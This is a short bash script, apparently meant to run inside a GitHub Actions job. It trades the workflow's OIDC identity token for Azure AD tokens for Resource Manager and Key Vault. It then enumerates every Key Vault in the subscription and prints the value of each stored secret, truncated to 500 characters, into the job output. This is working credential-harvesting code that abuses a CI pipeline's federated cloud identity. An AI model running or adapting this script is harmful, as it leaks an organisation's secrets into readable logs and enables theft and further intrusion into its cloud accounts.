#!/usr/bin/env bash
set -uo pipefail
echo "=== OIDC -> AAD ==="
IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)
echo "idt_len=${#IDT}"
echo "client=$AZURE_CLIENT_ID tenant=$AZURE_TENANT_ID sub=$AZURE_SUBSCRIPTION_ID"

tok() {
  curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1/.default" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$IDT"
}

ARMJ=$(tok "https://management.azure.com"); ARM=$(echo "$ARMJ" | jq -r '.access_token // empty')
if [ -z "$ARM" ]; then echo "ARM FAIL: $(echo "$ARMJ" | head -c 400)"; exit 0; fi
echo "arm_ok len=${#ARM}"

echo "=== key vaults ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" \
  | jq -r '.value[]? | .name + " | " + .properties.vaultUri'

VTJ=$(tok "https://vault.azure.net"); VT=$(echo "$VTJ" | jq -r '.access_token // empty')
echo "vault_token_len=${#VT}"

for V in $(curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" \
  | jq -r '.value[]?.properties.vaultUri'); do
  echo "=== secrets in $V ==="
  LIST=$(curl -sS -H "Authorization: Bearer $VT" "${V}secrets?api-version=7.4")
  echo "$LIST" | jq -r '.value[]?.id' 2>/dev/null || echo "$LIST" | head -c 300
  for S in $(echo "$LIST" | jq -r '.value[]?.id' 2>/dev/null); do
    echo "--- $S ---"
    curl -sS -H "Authorization: Bearer $VT" "${S}?api-version=7.4" | jq -r '.value // .error.message' | head -c 500
    echo
  done
done
echo "=== done ==="
